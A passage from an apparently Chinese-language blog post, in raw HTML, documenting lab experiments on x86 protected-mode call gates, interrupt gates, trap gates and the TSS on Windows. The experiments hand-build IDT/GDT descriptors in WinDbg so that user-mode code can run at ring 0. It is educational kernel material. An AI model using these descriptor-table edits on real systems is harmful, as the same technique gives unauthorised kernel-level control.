class=\"line\"></span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tpushfd</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpush fs\t<span class=\"comment\">//保存R3的fs</span></span><br><span class=\"line\">\t\tmov ax, <span class=\"number\">0x30</span><span class=\"comment\">//切换R0的fs</span></span><br><span class=\"line\">\t\tmov fs, ax;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tlea eax, [msg]</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tcall myDbgPrint</span><br><span class=\"line\">\t\tadd esp, <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpop fs\t<span class=\"comment\">//恢复R3的fs</span></span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tretf</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">6</span>]=&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4b</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,test);</span><br><span class=\"line\">\t*(<span class=\"type\">int</span>*)&amp;buf[<span class=\"number\">0</span>]=(<span class=\"type\">int</span>)test;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tcall fword ptr buf;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打开dbgView进行监视。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028203140417.png\" alt=\"image-20221028203140417\"></p>\n<p>运行R3程序。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221028203401508.png\" alt=\"image-20221028203401508\"></p>\n<p>成功输出，但是不知道为啥DbgView没捕获到。</p>\n<blockquote>\n<p>补充：设置完DbgView了之后重新打开就行了。</p>\n</blockquote>\n<h1 id=\"4、中断门\"><a href=\"#4、中断门\" class=\"headerlink\" title=\"4、中断门\"></a>4、中断门</h1><blockquote>\n<p>硬件叫做中断，软件叫做异常。</p>\n</blockquote>\n<p>中断门，CPU执行如下的指令：<code>INT N</code>，查询的是另外一张表，这张表叫IDT表。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029154208996.png\" alt=\"image-20221029154208996\"></p>\n<p>表的含义与调用门基本一致。这里面的D代表了default默认是1。windbg同样也提供了类似GDT表查询的指令,<code>r idtr</code>、<code>r idtl</code>。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029154542770.png\" alt=\"image-20221029154542770\"></p>\n<p>使用<code>dq idtr</code>查看idt表。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029154614726.png\" alt=\"image-20221029154614726\"></p>\n<p>其中每个中断描述符代表了一个中断函数。常见R3层的int 3指令对应的是<code>83e5ee00·00084fc0</code>，拆分后得到的中断函数(Offset)为0x83e54fc0,使用windbg查看该地址的反汇编。</p>\n<blockquote>\n<p>int3 与 int 3作用相同,都是查询IDT表index为3的描述符。但int3只有一个字节(0xCC),int 3占两个字节(CD 03)</p>\n</blockquote>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029155527981.png\" alt=\"image-20221029155527981\"></p>\n<p>windbg同样提供了<code>!idt n</code>指令用于查看对应中断序号的中断函数。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029155648779.png\" alt=\"image-20221029155648779\"></p>\n<h2 id=\"实验一：构造中断门\"><a href=\"#实验一：构造中断门\" class=\"headerlink\" title=\"实验一：构造中断门\"></a>实验一：构造中断门</h2><blockquote>\n<p>关闭增量链接和随机地址。</p>\n</blockquote>\n<p>首先获取函数地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tiretd\t<span class=\"comment\">//中断门使用的是iretd,d代表dword，32位。实模式(16)</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,test);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029161147825.png\" alt=\"image-20221029161147825\"></p>\n<p>然后构造描述符。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">offset:<span class=\"number\">0x00401000</span></span><br><span class=\"line\">segment selector:<span class=\"number\">0008</span>（<span class=\"number\">0</span>环）</span><br><span class=\"line\">P：<span class=\"number\">1</span></span><br><span class=\"line\">DPL：<span class=\"number\">3</span>（确保<span class=\"number\">3</span>环有权限访问该中断描述符）</span><br><span class=\"line\"></span><br><span class=\"line\">=<span class=\"number\">0040</span>EE00`<span class=\"number\">00081000</span></span><br></pre></td></tr></table></figure>\n\n<p>然后在idtr+0x100处写入我们的描述符。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029161254790.png\" alt=\"image-20221029161254790\"></p>\n<p>代码中添加int的调用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,test);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span>   <span class=\"comment\">//0x100 / 0x8 = 0x20</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行后，windbg中断。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029162514739.png\" alt=\"image-20221029162514739\"></p>\n<p>输入g命令继续执行，此时发现r3层异常中断，原因为int 3造成,去掉int 3即可正常运行。</p>\n<h2 id=\"实验二：堆栈影响\"><a href=\"#实验二：堆栈影响\" class=\"headerlink\" title=\"实验二：堆栈影响\"></a>实验二：堆栈影响</h2><p>重新运行实验一的代码，在执行int 0x20前，观察寄存器和段寄存器的值。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029162813573.png\" alt=\"image-20221029162813573\"></p>\n<p>然后继续执行。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029162956265.png\" alt=\"image-20221029162956265\"></p>\n<p>可以看到中断门先后压入了ss、esp、efl、cs、下一条语句的地址。因此进入中断门的堆栈结构如下：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221030123121116.png\" alt=\"image-20221030123121116\"></p>\n<h2 id=\"实验三：IF\"><a href=\"#实验三：IF\" class=\"headerlink\" title=\"实验三：IF\"></a>实验三：IF</h2><p>将代码修改为如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> val = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpushfd</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t\tmov dword ptr [val],eax  <span class=\"comment\">//获取efl</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span></span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,test);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tpushfd   <span class=\"comment\">//保存环境</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span></span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\n&quot;</span>,val);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行后windbg断下，输入<code>dds esp</code>查看堆栈</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221030122710511.png\" alt=\"image-20221030122710511\"></p>\n<p>堆栈值未变，那么输入<code>uf 401000</code>查看一下函数的反汇编.</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221030122744380.png\" alt=\"image-20221030122744380\"></p>\n<p>dd一下变量val的值。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221030122813632.png\" alt=\"image-20221030122813632\"></p>\n<p>神奇的发现堆栈中保存的efl与获取到的efl不一样！！！！！！原因是，int 3同时也是进入中断门，因此当前堆栈保存的是int 3的efl。分别将0x46和0x246转换为二进制。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x046 = 0000 0100 0110</span><br><span class=\"line\">0x246 = 0010 0100 0110</span><br></pre></td></tr></table></figure>\n\n<p>可以发现第九位有区别，第九位在eflags文档中为IF为，中断启用标志。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221029164026531.png\" alt=\"image-20221029164026531\"></p>\n<ul>\n<li><p><strong>可屏蔽中断请求</strong>：如键盘输入，鼠标点击都是一次可屏蔽中断请求。</p>\n</li>\n<li><p><strong>不可屏蔽中断请求：</strong>CPU必须立即无条件响应的请求，如电源断电。</p>\n</li>\n</ul>\n<p>大概意思就是我们自己的int 0x20中断后无法对鼠标或者键盘之类的外设输入进行响应，但是int 3可以。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cli; //清除Efl的IF位 </span><br><span class=\"line\">sti; //设置Efl的IF位</span><br></pre></td></tr></table></figure>\n\n<p>然后火哥说中断门会清空VM、TF、NF、IF位。</p>\n<ul>\n<li><p>VM（Vitual-8086 Mode）：虚拟8086模式，这个是为了16位兼容，在C:\\windows下除了有system32还有一个是system(实模式)。当这个为1时表示运行在一个虚拟的16位系统（可分页可分段，访问的不是物理地址）。</p>\n</li>\n<li><p>TF（Trap Flag）：单步位（相当于OD的F7，F8不算单步，因为他跳过了call），如果为1表示下一行代码执行时会发生异常。</p>\n</li>\n<li><p>NT（Nested Task）：任务嵌套位。为1时有上一层要返回。</p>\n</li>\n</ul>\n<p>中断门之所以会清空这三个标志位是因为防止中断嵌套</p>\n<p>可以理解为清空IF是为了防止其他中断打断；清空TF是防止在执行中断门里边的代码时一直异常；清空NF位是为了防止执行完就会返回（<code>有点还不太了解，因为还没学到任务门</code>）；清空VM位不是很理解。</p>\n<blockquote>\n<p>调用门与中断门的区别是，<u>调用门能被可屏蔽中断打断。</u></p>\n</blockquote>\n<h1 id=\"5、陷阱门\"><a href=\"#5、陷阱门\" class=\"headerlink\" title=\"5、陷阱门\"></a>5、陷阱门</h1><p>陷阱门的格式与中断门一致，唯独不同的地方就是Type位。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221030124607785.png\" alt=\"image-20221030124607785\"></p>\n<h2 id=\"实验一：VM、TF、IF、NT\"><a href=\"#实验一：VM、TF、IF、NT\" class=\"headerlink\" title=\"实验一：VM、TF、IF、NT\"></a>实验一：VM、TF、IF、NT</h2><p>将中断门的描述符改为0040EF00&#96;00081000</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221030124837901.png\" alt=\"image-20221030124837901\"></p>\n<p>然后执行代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> val = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) test()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpushfd</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t\tmov dword ptr [val],eax</span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%p\\n&quot;</span>,test);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t_asm&#123;</span><br><span class=\"line\">\t\tpushfd</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span></span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\n&quot;</span>,val);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到此时EFL为246.</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221030124917851.png\" alt=\"image-20221030124917851\"></p>\n<p>说明它禁止响应可屏蔽中断。</p>\n<blockquote>\n<p>IDT中没有用到陷阱门。</p>\n</blockquote>\n<p>然后中断门和陷阱门的区别就是：中断门由于IF为为0，表明不会被其他中断打断，而陷阱门有可能会被打断。</p>\n<h1 id=\"6、任务段\"><a href=\"#6、任务段\" class=\"headerlink\" title=\"6、任务段\"></a>6、任务段</h1><p>任务段(TSS：Task-State Segment)描述的是一个任务环境，用于进程和线程的环境的切换。TSS是一种<code>结构数据</code>且保存在内存中。内存的位置被描述在GDT中。</p>\n<p>由于任务太过依赖于GDT表中的任务段描述和内存块，因此Windows 和Linux 都没有采用任务段（不想被CPU限制）。</p>\n<p>TSS结构如下：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031142520796.png\" alt=\"image-20221031142520796\"></p>\n<ul>\n<li>ESP0、SS0：从R3切换至R0时，切换的堆栈数据。</li>\n<li>EIP：任务的地址地址。</li>\n<li>通用寄存器、段选择子、EFLAGS：自定义。</li>\n<li>CR3：来源R3</li>\n<li>Previous Task Link：上一个TSS的选择子。</li>\n</ul>\n<p><code>TSS是最小104字节的内存</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Avoid placing a page boundary in the part of the TSS that the processor reads during a task switch (the first 104</span><br><span class=\"line\">bytes). The processor may not correctly perform address translations if a boundary occurs in this area. During</span><br><span class=\"line\">a task switch, the processor reads and writes into the first 104 bytes of each TSS (using contiguous physical</span><br><span class=\"line\">addresses beginning with the physical address of the first byte of the TSS). So, after TSS access begins, if part</span><br><span class=\"line\">of the 104 bytes is not phy</span><br><span class=\"line\"></span><br><span class=\"line\">避免在TSS中处理器在任务切换期间读取的部分(前104字节)。如果该区域出现边界，处理器可能无法正确执行地址转换。在一个任务开关，处理器读写每个TSS的前104(0x68)个字节(使用连续的物理以TSS的第一个字节的物理地址开头的地址)。因此，在TSS访问开始后，如果部分在这104个字节不是物理连续的，处理器将访问不正确的信息而不生成一个页面错误异常。</span><br></pre></td></tr></table></figure>\n\n<p>在windbg中使用命令<code>dt structName [addr]</code>来查看结构体数据，查看TSS命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dt _KTSS</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031143307127.png\" alt=\"image-20221031143307127\"></p>\n<p>TSS同样有str和ltr指令。str用于获取、ltr用于加载。但不同的是,tr保存的是一个选择子。windbg中使用命令<code>r tr</code>，获取选择子。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031143448888.png\" alt=\"image-20221031143448888\"></p>\n<p>0x28拆分得到index后可寻址到描述TSS的描述符，也可以使用<code>dg</code>命令。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031143703152.png\" alt=\"image-20221031143703152\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031144646917.png\" alt=\"image-20221031144646917\"></p>\n<p>描述TSS的描述符结构如下：</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031144418041.png\" alt=\"image-20221031144418041\"></p>\n<p>描述符的结构与段描述符基本一致，需要注意的有两个地方，<u>一个是Type位的B表示的是Busy，即当前任务是否处于忙碌状态(是否在执行)，1表示忙碌，0表示非忙碌。Base表示Tss这块内存数据保存的地址。</u></p>\n<p>此时重新使用dt命令解析TSS。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20221031145236635.png\" alt=\"image-20221031145236635\"></p>\n<p>可以看到Flags为0x8b,b&#x3D;1011,B&#x3D;1表示busy。</p>\n<h2 id=\"实验一：构造任务段\"><a href=\"#实验一：构造任务段\" class=\"headerlink\" title=\"实验一：构造任务段\"></a>实验一：构造任务段</h2><blockquote>\n<p>关闭增量链接、关闭地址随机</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//0x2024 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KiIoAccessMap</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    UCHAR DirectionMap[<span class=\"number\">32</span>];                                                 <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR IoMap[<span class=\"number\">8196</span>];                                                      <span class=\"comment\">//0x20</span></span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//0x20ac bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KTSS</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    USHORT Backlink;                                                        <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    USHORT Reserved0;                                                       <span class=\"comment\">//0x2</span></span><br><span class=\"line\">    ULONG Esp0;                                                             <span class=\"comment\">//0x4</span></span><br><span class=\"line\">    USHORT Ss0;                                                             <span class=\"comment\">//0x8</span></span><br><span class=\"line\">    USHORT Reserved1;                                                       <span class=\"comment\">//0xa</span></span><br><span class=\"line\">    ULONG NotUsed1[<span class=\"number\">4</span>];                                                      <span class=\"comment\">//0xc</span></span><br><span class=\"line\">    ULONG CR3;                                                              <span class=\"comment\">//0x1c</span></span><br><span class=\"line\">    ULONG Eip;                                                              <span class=\"comment\">//0x20</span></span><br><span class=\"line\">    ULONG EFlags;                                                           <span class=\"comment\">//0x24</span></span><br><span class=\"line\">    ULONG Eax;                                                              <span class=\"comment\">//0x28</span></span><br><span class=\"line\">    ULONG Ecx;                                                              <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    ULONG Edx;                                                              <span class=\"comment\">//0x30</span></span><br><span class=\"line\">    ULONG Ebx;                                                              <span class=\"comment\">//0x34</span></span><br><span class=\"line\">    ULONG Esp;                                                              <span class=\"comment\">//0x38</span></span><br><span class=\"line\">    ULONG Ebp;                                                              <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">    ULONG Esi;                                                              <span class=\"comment\">//0x40</span></span><br><span class=\"line\">    ULONG Edi;                                                              <span class=\"comment\">//0x44</span></span><br><span class=\"line\">    USHORT Es;                                                              <span class=\"comment\">//0x48</span></span><br><span class=\"line\">    USHORT Reserved2;                                                       <span class=\"comment\">//0x4a</span></span><br><span class=\"line\">    USHORT Cs;                                                              <span class=\"comment\">//0x4c</span></span><br><span class=\"line\">    USHORT Reserved3;                                                       <span class=\"comment\">//0x4e</span></span><br><span class=\"line\">    USHORT Ss;                                                              <span class=\"comment\">//0x50</span></span><br><span class=\"line\">    USHORT Reserved4;                                                       <span class=\"comment\">//0x52</span></span><br><span class=\"line\">    USHORT Ds;                                                              <span class=\"comment\">//0x54</span></span><br><span class=\"line\">    USHORT Reserved5;                                                       <span class=\"comment\">//0x56</span></span><br><span class=\"line\">    USHORT Fs;                                                              <span class=\"comment\">//0x58</span></span><br><span class=\"line\">    USHORT Reserved6;                                                       <span class=\"comment\">//0x5a</span></span><br><span class=\"line\">    USHORT Gs;                                                              <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">    USHORT Reserved7;                                                       <span class=\"comment\">//0x5e</span></span><br><span class=\"line\">    USHORT LDT;                                                             <span class=\"comment\">//0x60</span></span><br><span class=\"line\">    USHORT Reserved8;                                                       <span class=\"comment\">//0x62</span></span><br><span class=\"line\">    USHORT Flags;                                                           <span class=\"comment\">//0x64</span></span><br><span class=\"line\">    USHORT IoMapBase;                                                       <span class=\"comment\">//0x66</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KiIoAccessMap</span> <span class=\"title\">IoMaps</span>[1];</span>                                        <span class=\"comment\">//0x68</span></span><br><span class=\"line\">    UCHAR IntDirectionMap[<span class=\"number\">32</span>];                                              <span class=\"comment\">//0x208c</span></span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KTSS</span> <span class=\"title\">tss</span> =</span> &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">__declspec(naked) <span class=\"type\">void</span> <span class=\"title function_\">a</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">\t\tiretd;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> esp3[<span class=\"number\">0x2000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\"><span class=\"type\">char</span> esp0[<span class=\"number\">0x2000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> trcode[<span class=\"number\">2</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstr trcode;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(esp3,<span class=\"number\">0xCC</span>,<span class=\"number\">0x2000</span>);<span class=\"comment\">//挂物理页</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;tss地址：%x\\n&quot;</span>, &amp;tss);</span><br><span class=\"line\">\ttss.Eax = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Ecx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Edx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Ebx = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Ebp = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Esi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Edi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\ttss.Cs = <span class=\"number\">0x8</span>;</span><br><span class=\"line\">\ttss.Ss = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\ttss.Ds = <span class=\"number\">0x23</span>;</span><br><span class=\"line\">\ttss.Esp = (ULONG)(esp3+<span class=\"number\">0x2000</span><span class=\"number\">-8</span>);</span><br><span class=\"line\">\ttss.Esp0 = (ULONG)(esp0+<span class=\"number\">0x2000</span><span class=\"number\">-8</span>);</span><br><span class=\"line\">\ttss.Ss0 = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\ttss.Fs = <span class=\"number\">0x30</span>;</span><br><span class=\"line\">\ttss.Eip = (ULONG)a;</span><br><span class=\"line\">\tDWORD dwCr3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入CR3:&quot;</span>);</span><br><span class=\"line\">\tscanf_s(<span class=\"string\">&quot;%x&quot;</span>, &amp;dwCr3);</span><br><span class=\"line\">\ttss.CR3 = dwCr3;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;CR3:%x&quot;</span>, tss.CR3);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;func:%x esp0:%x esp3:%x&quot;</span>, a, tss.Esp0, tss.Esp);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// printf(&quot;%x\\n&quot;, sizeof(KTSS));</span></span><br><span class=\"line\">\t<span class=\"type\">char</span> bufcode[<span class=\"number\">6</span>] = &#123; <span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x48</span>,<span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span 